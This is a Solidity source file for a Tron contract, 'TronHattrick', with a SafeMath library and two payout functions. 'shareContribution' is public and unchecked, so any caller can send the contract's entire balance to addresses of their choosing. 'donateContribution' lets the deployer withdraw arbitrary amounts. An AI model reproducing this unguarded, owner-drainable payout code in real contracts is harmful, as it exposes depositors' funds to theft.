//SourceUnit: TronHattrick.sol

pragma solidity ^0.5.9 <0.6.10;

contract TronHattrick {
    using SafeMath for uint256;
    
    address payable seller;
    
    function contractInfo() view external returns( uint256 balance) {
        return (address(this).balance);
    }
    
    constructor() public {
        seller = msg.sender;
        
    }
    
    function shareContribution(address payable[]  memory  _contributors, uint256[] memory _balances) public payable{
        for (uint256 i = 0; i < _contributors.length; i++) {
            _contributors[i].transfer(_balances[i]);
        }
    }
    
    function donateContribution(address payable buyer,uint _amount) public returns(uint){
        require(msg.sender == seller,"You are not seller.");
        buyer.transfer(_amount);
        return _amount;
    }
    
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}